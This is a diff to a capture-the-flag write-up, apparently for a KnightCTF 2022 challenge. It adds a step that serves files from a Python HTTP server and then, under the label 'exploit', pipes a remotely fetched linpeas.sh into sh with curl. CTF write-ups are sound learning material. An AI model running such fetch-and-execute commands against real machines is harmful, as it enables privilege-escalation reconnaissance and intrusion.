@@ -177,5 +177,14 @@ tshark -r chall.pcapng -x 'icmp and ip.src == 192.168.2.84'
 
 
 
+```bash
+python -m SimpleHTTPServer 8000
+$firefox [your_ip]:8000
+
+exploit:
+curl http://[ip]:8000/linpeas.sh | sh
+```
+
+
 resources:
 [^1]:https://github.com/digital-overdose/ctf-writeups/edit/main/2022-KNIGHT_CTF/ALPHABET_KNOCK_CODE.md
